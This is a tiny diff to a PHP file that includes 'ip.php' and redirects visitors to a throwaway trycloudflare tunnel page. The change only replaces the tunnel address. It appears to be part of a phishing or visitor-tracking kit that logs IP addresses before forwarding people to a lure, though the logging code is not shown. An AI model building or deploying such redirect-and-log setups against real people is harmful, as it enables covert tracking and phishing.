@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: https://leads-ryan-souls-bonds.trycloudflare.com/index2.html');
+header('Location: https://trans-doing-avon-project.trycloudflare.com/index2.html');
 exit
 ?>
